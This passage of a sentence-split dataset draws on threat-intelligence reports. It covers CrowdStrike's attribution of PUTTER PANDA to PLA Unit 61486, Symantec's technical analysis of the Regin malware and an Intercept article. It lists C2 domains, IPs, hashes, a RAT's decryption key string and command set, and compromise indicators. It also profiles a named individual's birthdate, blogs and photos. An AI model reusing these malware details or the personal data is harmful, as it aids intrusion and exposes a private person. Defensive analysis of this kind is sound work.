botanict.com domain resolved from 11 October 2012 to 24 March 2013 .", "5551": "During part of this timeframe ( 30 June 2012 - 30 October 2012 ) , a domain associated with COMMENT PANDA resolved to this same IP address : login .", "5552": "aolon1ine.com .", "5553": "Additionally , for a brief period in April 2012 , update8.firefoxupdata.com also resolved to this IP address .", "5554": "The use of the same IP address during the same time suggests that there is perhaps some cooperation or shared resources between COMMENT PANDA and PUTTER PANDA .", "5555": "Although not as conclusive as the links to COMMENT PANDA , IP address 31.170.110.163 was associated with VIXEN PANDA domain blog .", "5556": "strancorproduct.info from November to December 2013 .", "5557": "In February 2014 , this IP address was also associated with PUTTER PANDA domain ske.hfmforum .", "5558": "com .", "5559": "While not directly overlapping , this potential infrastructure link is interesting , as VIXEN PANDA has previously displayed TTPs similar to COMMENT PANDA ( other CrowdStrike reporting describes VIXEN PANDA malware that extracts C2 commands embedded between delimiters in web content ) , and has extensively targeted European entities .", "5560": "11 Several email addresses have been associated with cpyy , who also appears to use the alternate handles cpiyy and cpyy.chen : The cpyy.net domain lists '' Chen Ping '' as the registrant name , which may be cpyy 's real name , as this correlates with the initials '' cp '' in '' cpyy '' .", "5561": "A personal blog for cpyy was found at http : //cpiyy.blog.163.com/ .", "5562": "The profile on this blog ( shown in Figure 2 below ) indicates that the user is male , was born on 25 May 1979 , and works for the '' military/police '' ( \u5176\u4ed6- \u519b\u4eba/\u8b66\u5bdf ) .", "5563": "This blog contains two postings in the '' IT '' category that indicate at least a passing interest in the topics of networking and programming .", "5564": "A related CSDN profile for user cpiyy indicates that cpyy was working on or studying these topics in 2002 and 2003 .", "5565": "Another personal blog for cpyy ( http : //www.tianya.cn/1569234/bbs ) appears to have last been updated in 2007 .", "5566": "This states that the user lives in Shanghai , and has a birthdate identical to that in the 163.com blog .", "5567": "cpyy was also active on a social networking site called XCar , stating that he lived in Shanghai as early as 2005 through 2007 ; he said in a post , '' Soldier 's duty is to defend the country , as long as our country is safe , our military is excellent '' , indicating a feeling of patriotism that could be consistent with someone who chose a military or police-based career .", "5568": "On the XCar forum , cpyy.chen used a subforum called POLO ( hacker slang for '' Volkswagen cars '' ) to communicate with other users Linxder , peggycat , '' Naturally do not understand romance '' ( \u5929\u751f\u4e0d\u61c2\u6d6a\u6f2b ) , '' a wolf '' ( \u4e00\u53ea\u5927\u7070\u72fc ) , '' large tile '' ( \u5927\u74e6\u7247 ) , '' winter '' ( \u51ac\u591c ) , '' chunni '' ( \u6625\u59ae ) , papaya , kukuhaha , Cranbing , '' dusty sub '' ( \u591a\u5c18\u5b50 ) , z11829 , '' ice star harbor '' ( \u51b0\u661f\u6e2f ) , '' polytechnic Aberdeen '' ( \u7406\u5de5\u4ed4 ) , '' I love pineapple pie '' ( \u6211\u7231\u83e0\u7f57\u6d3e ) , and '' she 's distant '' in 2007 .", "5569": "Although superficially the discussion is about cars , there is a repeated word in the text , '' milk yellow package '' or '' custard package '' or '' yoke package '' ( \u5976\u9ec4\u5305 ) .", "5570": "This could be a hacker slang word , but it is unclear as to the definition .", "5571": "The conversation alludes to Linxder being the '' teacher '' or '' landlord '' and the other aforementioned users are his '' students '' .", "5572": "Linxder references how he has '' found jobs '' for them .", "5573": "It is possible that this is a reference to hacking jobs wrapped up in car metaphors .", "5574": "Linxder is the handle of an actor associated with the likely Shanghai-based COMMENT PANDA group .", "5575": "Linxder , cpyy , and xiaobai have all discussed programming and security related topics on cpyy 's site , cpyy.org , which hosted a discussion forum for the 711 Network Security Team ( see below ) .", "5576": "cpyy also appears to have a keen interest in photography ; his 163.com blog includes several photographs taken by cpyy in the blog postings and albums section .", "5577": "Some of these photographs also appear in a Picasa site ( examples are shown in Figures 5 and 6 ) belonging to a user cpyy.chen .", "5578": "An album in this site named '' me '' has several shots of what is likely cpyy himself , from 2005 , 2006 , and 2007 , shown to the right : An account on rootkit.com , a popular low-level software security site , existed for user cpyy and was accessed in at least May 2004 .", "5579": "This account was registered with primary email address cpyy @ cpyy.net and backup email address cpyy @ hotmail.com ; it listed a date of birth as 24 May 1979 , consistent with cpyy 's other profiles .", "5580": "The IP address 218.242.252.214 was associated with this account ; it is owned by the Oriental Cable Network Co. , Ltd. , an ISP located in Shanghai .", "5581": "Registration on this forum shows that cpyy had an interest in security-related programming topics , which is backed up by the postings on his personal blog and CSDN account .", "5582": "One of the sites registered to cpyy was used to host a web-based email service , along with a forum on www .", "5583": "cpyy.net .", "5584": "Both of these services were apparently run by the 711 Network Security Team ( 711\u7f51\u7edc\u5b89\u5168\u5c0f\u7ec4 ) , a group that is now likely defunct , but has previously published security-based articles that have been re-posted on popular Chinese hacking sites such as xfocus.net .", "5585": "One of these articles , entitled '' IMD-based packet filtering firewall to achieve the principles '' , is apparently authored by xiaobai , with email address xiaobai @ openfind.com.cn ; it was published on the '' GRATEFUL '' ( \u996e\u6c34\u601d\u6e90 ) security digest list that is hosted by Shanghai Jiao Tong University ( SJTU ) .", "5586": "This digest list/bulletin board was also frequented by ClassicWind , an actor possibly linked to the Shanghai-based , PLA-sponsored adversary group COMMENT PANDA , as described in .", "5587": "This Tipper also indicates that '' the Chinese Communist Party ( CCP ) and the People 's Liberation Army ( PLA ) aggressively target SJTU and its School of Information Security Engineering ( SISE ) as a source of research and student recruitment to conduct network offense and defense campaigns '' , so it is possible that the 711 Network Security Team members came to the attention of the Chinese state via this institution .", "5588": "An additional connection to SJTU comes from a C2 domain , checalla.com , used with the 4H RAT in 2008 .", "5589": "This domain was registered to httpchen @ gmail .", "5590": "com at the time , and this address was also used to make a posting on the GRATEFUL BBS ( shown in Figure 7 ) .", "5591": "The posting indicates that httpchen is located at the \u95f5\u884c ( Minhang ) campus of SJTU and was posting using IP address 58.196.156.15 , which is associated with the China Education and Research Network ( CERNET ) , a nationwide network managed by the Chinese Ministry of Education .", "5592": "It also states that httpchen is studying at the school of Information Security Engineering within SJTU .", "5593": "Several pieces of evidence indicate that cpyy probably has connections to , or is part of , the Chinese military \u2013 specifically the PLA Army .", "5594": "In addition to his declaration on his personal blog that he works for the '' military/ police '' , and contacts with actors such as Linxder that have been previously associated with hacking units within the PLA , cpyy 's Picasa site contains several photographs that hint at military connections .", "5595": "First , a monochrome picture from the \u5927\u5b66\u65f6\u4ee3 ( '' college '' ) album posted in February 2007 shows several uniformed individuals : It is not clear whether this picture includes cpyy , or just friends/ associates/relatives .", "5596": "A picture from the \u4e2d\u5b66\u65f6\u4ee3 ( '' high school '' ) album posted in February 2007 shows a male \u2013 likely cpyy based on the clothing shown in the second picture , which matches the pictures of cpyy shown above \u2013 performing exercise in front of a group of likely soldiers and an officer : Although somewhat unclear , pictures from the album 2002\u5e74\u7684\u751f\u65e5 ( '' 2002 birthday '' ) , also posted in February 2007 , show the celebrant ( likely cpyy ) in khaki clothes that are possibly military wear .", "5597": "The most compelling pictures , however , are found in the \u5bbf\u820d and \u529e\u516c\u5ba4 albums ( '' dormitory '' and '' office '' ) .", "5598": "A shot of probably cpyy 's dormitory room shows in the background two military hats that appear to be Type 07 PLA Army officer peak hats : 18 This album also contains a shot of the exterior of a building with several large satellite dishes outside : This same building and the satellite dishes also appear in the '' office '' album .", "5599": "The reflection effects observed on the windows of this building could be due to coatings applied to resist eavesdropping via laser microphones and to increase privacy , which would be consistent with a military installation conducting sensitive work .", "5600": "Above is an image from the same album of what appears to be a larger dish , in front of the Oriental Pearl Tower , a significant landmark in Shanghai : As mentioned above , checalla.com was used for command and control with the PUTTER PANDA 4H RAT in 2008 .", "5601": "This domain was registered to httpchen @ gmail.com , and in May 2009 the domain registration details were updated to include a Registrant Address of '' shanghai yuexiulu 46 45 202 # '' .", "5602": "A search for this location reveals an area of Shanghai shown in Figure 8 .", "5603": "Figure 9 shows an enlargement of satellite imagery from within this area , depicting a facility containing several satellite dishes within green areas , sports courts and a large office building .", "5604": "Satellite imagery from 2009 showing another aspect of this office building , along with a likely vantage point and direction of camera , alongside probably cpyy 's photograph from the same angle , is shown in Figure 10 : Based on the Shanghai location , and common features , it is highly likely that the location shown above is the same as that photographed by cpyy and shown in the '' office '' and '' dormitory '' albums .", "5605": "Further confirmation can be found from photos uploaded by a user on Panoramio who tags the image as being located in Chabei , Shanghai , China ( 31\u00b0 17 ' 18.86 '' N 121\u00b0 27 ' 9.83 '' E ) .", "5606": "This image is exceptionally similar to building shown in cpyy 's '' office '' album ( see Figure 11 below ) .", "5607": "According to a public report on the Chinese PLA 's General Staff Department ( GSD ) , the 12th Bureau of the 3rd GSD is headquartered in the Zhabei district of Shanghai and '' appears to have a functional mission involving satellites , likely inclusive of intercept of satellite communications and possibly space-based SIGINT collection '' .", "5608": "The same report also lists a Military Unit Cover Designator ( MUCD ) of 61486 for this bureau .", "5609": "A webpage published on a Chinese government site detailing theatrical performances involving members of the PLA lists an address of '' \u95f8\u5317\u533a\u7ca4\u79c0\u8def46\u53f7 '' ( 46 Yue Xiu Road , Zhabei District ) for '' \u603b\u53c261486\u90e8\u961f '' ( 61486 Forces General Staff ) .", "5610": "A search for this location shows an identical area to that shown in Figure 8 .", "5611": "It can therefore be concluded with high confidence that the location shown in cpyy 's imagery , along with the satellite images above , is the headquarters of the 12th Bureau , 3rd GSD , Chinese PLA \u2013 also known as Unit 61486 .", "5612": "This unit 's suspected involvement in '' space surveillance '' and '' intercept of satellite communications '' fits with their observed targeting preferences for Western companies producing technologies in the space and imaging/remote sensing sectors .", "5613": "The size and number of dishes present in the area is also consistent with these activities .", "5614": "Observed build times for the PUTTER PANDA tools described in this report range from 2007 to late 2013 , indicating that the actors have conducted several campaigns against their objectives over a period of several years .", "5615": "A build time analysis of all known samples is shown in Figure 1 below , relative to China time .", "5616": "Although this shows that there is some bias in the build time distribution to daylight or working hours in China , which is more significant if a possible three-shift system of hours is considered ( 0900-1200 , 1400-1700 , and 2000-2300 ) , this evidence is not conclusive .", "5617": "There is also some evidence that build times are manipulated by the adversary ; for example , the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013 , but was supposedly first submitted to VirusTotal on 9 January 2013 .", "5618": "This shows that the attackers \u2013 at least in 2013 \u2013 were aware of some operational security considerations and were likely taking deliberate steps to hide their origins .", "5619": "There is strong evidence to tie cpyy , an actor who appears to have been involved in historical PUTTER PANDA operations , to the PLA army and a location in Shanghai that is operated by the 12th Bureau , 3rd GSD of the PLA ( Unit 61486 ) .", "5620": "Another actor tied to this activity , httpchen , has declared publically that he was attending the School of Information Security Engineering at SJTU .", "5621": "This university has previously been posited as a recruiting ground for the PLA to find personnel for its cyber intelligence gathering units , and there is circumstantial evidence linked cpyy to other actors based at SJTU .", "5622": "Given the evidence outlined above , CrowdStrike attributes the PUTTER PANDA group to PLA Unit 61486 within Shanghai , China with high confidence .", "5623": "It is likely that this organization is staffed in part by current or former students of SJTU , and shares some resources and direction with PLA Unit 61398 ( COMMENT PANDA ) .", "5624": "The most common of these , the 4H RAT and the 3PARA RAT , have been documented previously by CrowdStrike in previous CrowdStrike Intelligence reporting .", "5625": "This analysis will be revisited below , along with an examination of two other PUTTER PANDA tools : pngdowner and httpclient .", "5626": "This RAT was first analyzed by CrowdStrike in April 2012 , but a historical analysis shows that it has been in use since at least 2007 by the PUTTER PANDA actors .", "5627": "A listing of metadata for known samples , including C2 information , is shown in Appendix 1 .", "5628": "Other observed exported filenames are msacem.dll and mrpmsg.dll , although the RAT has also been observed in plain executable ( EXE ) format .", "5629": "The decoding algorithm is illustrated in Figure 10 below .", "5630": "The key and modulo values vary on a per-sample basis .", "5631": "Decoded C2 settings , along with sample metadata , are listed in Appendix 2 .", "5632": "The RAT is programmed in C++ using Microsoft Visual Studio , and it makes use of the object-oriented and parallel programming features of this environment ; Standard Template Library ( STL ) objects are used to represent data structures such as strings and lists , and custom objects are used to represent some of the C2 command handlers ( e.g. , CCommandCMD ) .", "5633": "Standard Windows primitives such as Events are used to synchronize across these threads , with a shared global structure used to hold state .", "5634": "A sample request and its structure are shown in Figure 12 .", "5635": "Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54 & % 9 & jkMCXuiS ( as used in the secondary beacon shown above ) .", "5636": "If this fails , the RAT will fall back to decoding the data using an 8-byte XOR with a key derived from data returned from the HashData API with the same key string .", "5637": "Some of the supported commands are implemented using C++ classes derived from a base CCommand class : \u2022C\u0007 CommandAttribe \u2013 Retrieve metadata for files on disk , or set certain attributes such as creation/ modification timestamps .", "5638": "\u2022 CCommandCD \u2013 Change the working directory for the current C2 session .", "5639": "\u2022C\u0007 CommandCMD \u2013 Execute a command , with standard input/output/error redirected over the C2 channel .", "5640": "\u2022 CCommandNOP \u2013 List the current working directory .", "5641": "However , other commands are not implemented in this way .", "5642": "These other commands contain functionality to : \u2022 Pause C2 activity for a random time interval .", "5643": "\u2022 Shutdown C2 activity and exit .", "5644": "\u2022P\u0007 rovide a date and time before which beaconing will not resume , recorded in the file C : \\RECYCLER\\ restore.dat as noted above .", "5645": "The use of C++ classes that inherit from a base class to carry out some of the tasking commands , along with the use of concurrency features , indicates that the developers of the RAT put some thought into the architecture and design of their tool , although the decision to implement some commands outside of the class-based framework is curious , and may indicate multiple developers worked on the RAT ( or a single developer with shifting preferences for his coding style ) .", "5646": "The pngdowner malware is a simple tool constructed using Microsoft Visual Studio and implemented via single C++ source code file .", "5647": "This sample contains a PDB path of Y : \\Visual Studio 2005\\Projects\\branch-downer\\ downer\\Release\\downer.pdb , but other similar paths Z : \\Visual Studio 2005\\Projects\\pngdowner\\Release\\ pngdowner.pdb and Z : \\Visual Studio 2005\\Projects\\downer\\Release\\downer.pdb have also been observed in other samples .", "5648": "Appendix 3 lists metadata for known pngdowner samples .", "5649": "A hard-coded user agent of myAgent is used for thisrequest , and subsequent communication with the C2 server .", "5650": "Content returned from this request to the C2 server will be saved to a file named index.dat in the user's temporary directory ( i.e. , % TEMP % ) .", "5651": "This file is expected to contain a single line , specifying a URL and a filename .", "5652": "Content returned from this request will be saved to a file , but then immediately deleted .", "5653": "Although the version mentioned here uses C++ , along with Visual Studios Standard Template Library ( STL ) , older versions of the RAT ( such as MD5 hash b54e91c234ec0e739ce429f47a317313 ) , built in 2011 , use plain C. This suggests that despite the simple nature of the tool , the developers have made some attempts to modify and perhaps modernize the code .", "5654": "Both versions contain debugging/progress messages such as '' down file success '' .", "5655": "Although these are not displayed to the victim , they were likely used by the developers as a simple means to verify functionality of their code .", "5656": "The decoded data is then checked for the string runshell .", "5657": "Shell commands from the server are followed by an encoded string $ $ $ , which indicates that the shell session should continue .", "5658": "Slight variations on the C2 URLs are used for different phases of the C2 interaction : Given the lack of a persistence mechanism and low level of sophistication , it is likely that httpclient \u2013 like pngdowner \u2013 is used as a second-stage or supplementary/backup tool .", "5659": "Appendix 4 lists metadata for observed httpclient samples .", "5660": "Several instances of this dropper have been observed , most commonly in association with the 4H RAT , but also in relation to other tools that will be described in forthcoming reporting .", "5661": "This dropper is simplistic in nature , and is compiled from a single C++ source code file .", "5662": "It contains a Word document in plaintext ( written to BienvenueaSahajaYogaToulouse .", "5663": "doc ) , along with an executable ( Update.exe ) and DLL ( McUpdate.dll ) .", "5664": "Module names corresponding to Outlook Express ( msinm.exe ) , Outlook ( outlook.exe ) , Internet Explorer ( iexplore.exe ) , and Firefox ( firefox.exe ) are used .", "5665": "The common theme throughout these documents is space technology ( BienvenueaSahajaYogaToulouse.doc does not follow this trend , but could be targeted at workers at the Toulouse Space Centre , the '' largest space centre in Europe '' ) , indicating that the attackers have a keen interest in this sector , which is also reflected in the choice of name for some of the C2 domains used ( see the Attribution section above ) .", "5666": "A number of specific and generic detection methods are possible for this RAT , both on a host and on the network .", "5667": "These are detailed below , and are designed to expand upon the indicators reported in other CrowdStrike reporting .", "5668": "The following Windows registry artifacts are indicative of a compromised host : redacted ) The presence of the following file system artifacts is indicative of a compromised host : A file mapping named & *SDKJfhksdf89*DIUKJDSF & *sdfsdf78sdfsdf also indicates the victim machine is compromised with PUTTER PANDA malware .", "5669": "In addition the domains listed in the Appendices and in the Attribution section , the generic signatures below can be used to detect activity from the malware described in this report .", "5670": "In addition to the indicators described above , PUTTER PANDA have some distinct generic TTPs : PUTTER PANDA are a determined adversary group who have been operating for several years , conducting intelligence-gathering operations with a significant focus on the space sector .", "5671": "Research presented in this report shows that the PUTTER PANDA operators are likely members of the 12th Bureau , 3rd General Staff Department ( GSD ) of the People 's Liberation Army ( PLA ) , operating from the unit 's headquarters in Shanghai with MUCD 61486 .", "5672": "Strategic objectives for this unit are likely to include obtaining intellectual property and industrial secrets relating to defense technology , particularly those to help enable the unit 's suspect mission to conduct space surveillance , remote sensing , and interception of satellite communications .", "5673": "PUTTER PANDA is likely to continue to aggressively target Western entities that hold valuable information or intellectual property relevant to these interests .", "5674": "The detection and mitigation guidance given in this report will help to minimize the risk of a successful compromise by these actors , and future CrowdStrike reports will examine other elements of the PUTTER PANDA toolset .", "5675": "CrowdStrike Falcon Intelligence portal provides enterprises with strategic , customized , and actionable intelligence .", "5676": "Falcon Intelligence enables organizations to prioritize resources by determining targeted versus commodity attacks , saving time and focusing resources on critical threats .", "5677": "With unprecedented insight into adversary tools , tactics , and procedures ( TTPs ) and multi-source information channels , analysts can identify pending attacks and automatically feed threat intelligence via API to SIEM and thirdparty security tools .", "5678": "Access to CrowdStrike Falcon Intelligence is geared toward all levels of an organization , from the executivewho needs to understand the business threat and strategic business impact , to the front-line securiyt professional struggling to ! ght through an adversary's attack against the enterprise .", "5679": "CrowdStrike Falcon Intelligence is a web-based intelligence subscription that includes full access to a variety of feature sets , including : CrowdStrike Falcon Host is an endpoint threat detection and response product that identifies unknown malware , detects zero-day threats , and prevents damage from targeted attacks in real-time .", "5680": "Falcon Host is comprised of two core components , the cloud-based management console and the on-premises host-based sensor that continuously monitors threat activity at the endpoint to prevent damage in real-time .", "5681": "Falcon Host leverages a lightweight kernel-mode sensor that shadows , captures , and correlates low- level operating system events to instantly identify the adversary tradecraft and activities through Stateful Execution Inspection ( SEI ) at the endpoint and Machine Learning in the cloud .", "5682": "As opposed to focusing on malware signatures , indicators of compromise , exploits , and vulnerabilities , Falcon Host instead identifies mission objectives of the adversary leveraging the Kill Chain model and provides realtime detection by focusing on what the attacker is doing , as opposed to looking nfor a specific , easily changeable indicator used in an attack .", "5683": "Without performing intrusive and performance- impacting scans of the system , Falcon Host 's highly efficient real-time monitoring of all system activity is the only security solution that provides maximum visibility into all adversary activities , including Adversary-in-Motion : reconnaissance , exploitation , privilege escalation , lateral movement , and exfiltration .", "5684": "Falcon Host delivers insight into past and current attacks not only on a single host , but also across devices and networks .", "5685": "Stateful Execution inspection Stateful Execution Inspection ( SEI ) tracks execution state and links together various stages of the kill chain , from initial code execution to data exfiltration .", "5686": "CrowdStrike 's Real-time Stateful Execution Engine performs inspection and analysis to understand the full context of a cyber attack .", "5687": "SEI is critical to understanding the entire attack life cycle and preventing the damage from advanced malware and targeted attacks .", "5688": "Existing security technologies that focus solely on malware signatures , incidators of compromise , exploits , and vulnerabilities fail to protect against the majority of attacks as they are blind to the full scope of adversary activity .", "5689": "CrowdStrike is a global provider of security technology and services focused on identifying advanced threats and targeted attacks .", "5690": "Using big-data technologies , CrowdStrike 's next-generation threat protection platform leverages real-time Stateful Execution Inspection ( SEI ) at the endpoint and Machine Learning in the cloud instead of solely focusing on malware signatures , indicators of compromise , exploits , and vulnerabilities .", "5691": "The CrowdStrike Falcon Platform is a combination of big data technologies and endpoint security driven by advanced threat intelligence .", "5692": "CrowdStrike Falcon enables enterprises to identify unknown malware , detect zero-day threats , pinpoint advanced adversaries and attribution , and prevent damage from targeted attacks in real time .", "5693": "CrowdStrike Services is a wholly owned subsidiary of CrowdStrike responsible for proactively defending against and responding to cyber incidents with pre and post Incident Response services .", "5694": "CrowdStrike 's seasoned team of Cyber Intelligence professionals , Incident Responders , and Malware Researchers consists of a number of internationally recognized authors , speakers , and experts who have worked on some of the most publicized and challenging intrusions and malware attacks in recent years .", "5695": "The CrowdStrike Services team leverages our Security Operations Center to monitor the full CrowdStrike Falcon Platform and provide cutting-edge advanced adversary intrusion detection services .", "5696": "The full spectrum of proactive and response services helps customers respond tactically as well as continually mature and strategically evolve Incident Response program capabilities .", "5697": "In the world of malware threats , only a few rare examples can truly be considered groundbreaking and almost peerless .", "5698": "What we have seen in Regin is just such a class of malware .", "5699": "Its stealth combines many of the most advanced techniques that we have ever seen in use .", "5700": "The level of sophistication and complexity of Regin suggests that the development of this threat could have taken well-resourced teams of developers many months or years to develop and maintain .", "5701": "Regin is a multi-staged , modular threat , meaning that it has a number of components , each depending on others , to perform attack operations .", "5702": "This modular approach gives flexibility to the threat operators as they can load custom features tailored to individual targets when required .", "5703": "Some custom payloads are very advanced and exhibit a high degree of expertise in specialist sectors .", "5704": "This modular approach has been seen in other sophisticated malware families such as Flamer and Weevil ( The Mask ) , while the multi-stage loading architecture is similar to that seen in the Duqu/Stuxnet family of threats .", "5705": "Regin is different to what are commonly referred to as '' traditional '' advanced persistent threats ( APTs ) , both in its techniques and ultimate purpose .", "5706": "Regin 's purpose is different .", "5707": "This report provides a technical analysis of Regin based on a number of identified samples and components .", "5708": "This analysis illustrates Regin 's architecture and the many payloads at its disposal .", "5709": "Regin is a multi-purpose data collection tool which dates back several years .", "5710": "Symantec first began looking into this threat in the fall of 2013 .", "5711": "Multiple versions of Regin were found in the wild , targeting several corporations , institutions , academics , and individuals .", "5712": "It also has the ability to load custom features tailored to individual targets .", "5713": "Some of Regin 's custom payloads point to a high level of specialist knowledge in particular sectors , such as telecoms infrastructure software , on the part of the developers .", "5714": "More advanced payload modules designed with specific goals in mind were also found in our investigations .", "5715": "In some cases , Symantec was only able to retrieve the threat samples but not the files containing stolen data .", "5716": "Symantec is aware of two distinct versions of Regin .", "5717": "Version 1.0 appears to have been used from at least 2008 to 2011 .", "5718": "Version 2.0 has been used from 2013 onwards , though it may have possibly been used earlier .", "5719": "Version 1.0 appears to have been abruptly withdrawn from circulation in 2011 .", "5720": "Version 1.0 samples found after this date seem to have been improperly removed or were no longer accessible to the attackers for removal .", "5721": "This report is based primarily on our analysis of Regin version 1.0 .", "5722": "We also touch on version 2.0 , for which we only recovered 64-bit files .", "5723": "Symantec has assigned these version identifiers as they are the only two versions that have been acquired .", "5724": "Regin likely has more than two versions .", "5725": "There may be versions prior to 1.0 and versions between 1.0 and 2.0 .", "5726": "The Regin operators do not appear to focus on any specific industry sector .", "5727": "Regin infections have been observed in a variety of organizations , including private companies , government entities , and research institutes .", "5728": "Infections are also geographically diverse , having been identified mainly in 10 different regions .", "5729": "The infection vector varies among targets .", "5730": "A reproducible infection vector is unconfirmed at time of writing .", "5731": "Regin has a six-stage architecture .", "5732": "The later stages bring Regin 's main payloads into play .", "5733": "This section presents a brief overview of the format and purpose of each stage .", "5734": "The most interesting stages are the executables and data files stored in Stages 4 and 5 .", "5735": "The initial Stage 1 driver is the only plainly visible code on the computer .", "5736": "Symantec Security Response has not obtained the Regin dropper at the time of writing .", "5737": "The dropper could be transient rather than acting as an executable file and may possibly be part of the infection vector exploit code .", "5738": "Once this happens , there are no remaining plainly visible code artifacts .", "5739": "The first two bytes are used and the remaining bytes are set to zero .", "5740": "The second byte indicates the exclusive maximum number of instances allowed to run , which is set to two .", "5741": "This means no more than one instance should run at any time .", "5742": "The first byte indicates how many instances were run or attempted to run .", "5743": "Therefore , the potential combinations for the first two bytes are : Stage 3 is a kernel mode DLL and is not stored in the traditional file system .", "5744": "Stage 3 can be found in the following locations : The file is six to seven times the size of the driver in Stage 2 .", "5745": "Stages 3 and above are based on a modular framework of code modules .", "5746": "These modules offer functions through a private , custom interface .", "5747": "Each file in stages 3 and above can '' export '' functionality to other parts of Regin .", "5748": "In the case of Stage 3 , the following primitives are offered : These primitives are provided through a custom export methodology .", "5749": "The Stage 3 DLL exports a wide range of functionality through a custom export methodology .", "5750": "The interface used to export functionality does not make use of the traditional Windows DLL export mechanism by name or ordinal .", "5751": "Exported Regin methods are referenced by a tuple consisting of a major and minor number .", "5752": "Stage 3 exports hundreds of methods , organized into 12 different major groups .", "5753": "The numbers used vary across versions .", "5754": "We acquired artifacts using two different numbering schemes .", "5755": "Table 2 is an example listing .", "5756": "With Regin 's modular nature , Stage 4 kernel modules and Stage 5 user modules ( payloads ) can provide functionality and export routines using the same major and minor numbering scheme .", "5757": "They are stored in two EVFS containers as files : \u2022 % System % \\config\\SystemAudit.Evt : Contains Stage 4 kernel drivers , which constitute the kernel mode part of Regin 's payload .", "5758": "\u2022 % System % \\config\\SecurityAudit.Evt : Contains a user mode version of Stage 3 .", "5759": "The files are injected into services.exe .", "5760": "Stage 4 also uses the same export methodology described in Stage 3 .", "5761": "Stage 5 consists of the main Regin payload functionality .", "5762": "Stage 5 files are EVFS containers containing other files : Regin 's payload involves the DLLs contained in the SystemLog.evt EVFS container .", "5763": "The payload functionality differs depending on the targeted computer .", "5764": "Custom payload files will likely be delivered for each specific environment .", "5765": "Such files are accessed by the major routines 3Dh .", "5766": "Known extensions for EVFS containers are *.evt and *.imd .", "5767": "The structure of a container is similar to the FAT file system .", "5768": "One major difference is that files do not have a name ; instead , they 're identified using a binary tag .", "5769": "The tag itself is the concatenation of a major number and a minor number .", "5770": "The major number typically indicates the major function group that will handle the file .", "5771": "A container starts with the header in Table 3 ( little-endian ordering ) .", "5772": "The header is followed by the file entry table ( Table 4 ) .", "5773": "Each file entry is 13h+taglen bytes long .", "5774": "The sectors follow ( Table 5 ) .", "5775": "A sector of sectsize bytes starts with a DWORD pointing to the next sector ( if the file does not fit within single sector ) , followed by sectsize-4 bytes of payload data .", "5776": "Other layers of encryption and compression may also be in place , although those would be handled by higher level components .", "5777": "The string 'shit ' is scattered in the packet for data validation .", "5778": "In addition , CRC checks use the seed '31337 ' .", "5779": "This information can be combined with another cookie for validation under the names USERIDTK , UID , GRID , UID=PREF=ID , TM , utma , LM , TMARK , VERSION , or CURRENT .", "5780": "The extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in order to enhance Regin 's capabilities .", "5781": "Furthermore , we have found data files accompanying payload modules that have not been recovered .", "5782": "The following table describes the Stage 4 kernel payload modules and Stage 5 user mode payload modules , which we have seen several variants of Regin use .", "5783": "Only a small amount of the 64-bit Regin files have been recovered .", "5784": "These samples may represent version 2.0 or their differences may possibly be solely specific to 64-bit versions of Regin .", "5785": "The recovered files do not appear to fundamentally vary from their 32-bit counterparts , apart from a few noteworthy differences .", "5786": "The 32-bit and 64-bit versions of Regin use different file names .", "5787": "These differences are shown in the first section of this paper as well as in the appendix .", "5788": "Most importantly , in the 64-bit version of Regin , the names of containers are changed : The 64-bit version of Regin 's Stage 1 ( wshnetc.dll ) is no longer a kernel mode driver , as drivers under 64-bit Windows must be signed .", "5789": "The 64-bit Regin 's Stage 3 has not been recovered .", "5790": "We believe that it may not exist , as the 32-bit version is a driver .", "5791": "Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export functionality .", "5792": "No Stage 5 payload modules have been recovered .", "5793": "The development and operation of this threat would have required a significant investment of time and resources .", "5794": "Threats of this nature are rare and are only comparable to the Stuxnet/Duqu family of malware .", "5795": "The discovery of Regin serves to highlight how significant investments continue to be made into the development of tools for use in intelligence gathering .", "5796": "Many components of Regin have still gone undiscovered and additional functionality and versions may exist .", "5797": "Symantec and Norton products detect this threat as Backdoor.Regin .", "5798": "Regin 's data files are classified as Stage 5 components and are contained in an EVFS container .", "5799": "As the data files are stored in a container , they do not have names .", "5800": "Just like Stage 5 modules , they are referenced by their filetag , which is the aggregation of the major and minor identifiers .", "5801": "The major identifier indicates which major routine group likely handles or creates the file .", "5802": "Not all data files have been recovered , so the information remains incomplete .", "5803": "Data files associated with Stage 4 kernel modules have not been recovered Table 8 lists recovered data files used by Stage 5 modules .", "5804": "The associated modules that supposedly manipulate those data files were not recovered .", "5805": "The following details can be used to help determine whether you have been impacted by this threat .", "5806": "Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the European Union and a Belgian telecommunications company , according to security industry sources and technical analysis conducted by The Intercept .", "5807": "The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward Snowden .", "5808": "The specific malware used in the attacks has never been disclosed , however .", "5809": "The Regin malware , whose existence was first reported by the security firm Symantec on Sunday , is among the most sophisticated ever discovered by researchers .", "5810": "Symantec compared Regin to Stuxnet , a state-sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility .", "5811": "Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their systems after they were compromised , linking the spy tool to the secret GCHQ and NSA operations .", "5812": "Ronald Prins , a security expert whose company Fox IT was hired to remove the malware from Belgacom 's networks , told The Intercept that it was '' the most sophisticated malware '' he had ever studied .", "5813": "'' Having analyzed this malware and looked at the [ previously published ] Snowden documents , '' Prins said , '' I 'm convinced Regin is used by British and American intelligence services .", "5814": "'' A spokesman for Belgacom declined to comment specifically about the Regin revelations , but said that the company had shared '' every element about the attack '' with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion .", "5815": "'' It 's impossible for us to comment on this , '' said Jan Margot , a spokesman for Belgacom .", "5816": "'' It 's always been clear to us the malware was highly sophisticated , but ever since the clean-up this whole story belongs to the past for us .", "5817": "The agency secretly installed so-called malware '' implants '' on the employees ' computers by sending their internet connection to a fake LinkedIn page .", "5818": "The software implants used in this case were part of the suite of malware now known as Regin .", "5819": "This involves the deployment of the malware in stages , making it more difficult to analyze and mitigating certain risks of being caught .", "5820": "Based on an analysis of the malware samples , Regin appears to have been developed over the course of more than a decade ; The Intercept has identified traces of its components dating back as far as 2003 .", "5821": "Regin was mentioned at a recent Hack.lu conference in Luxembourg , and Symantec 's report on 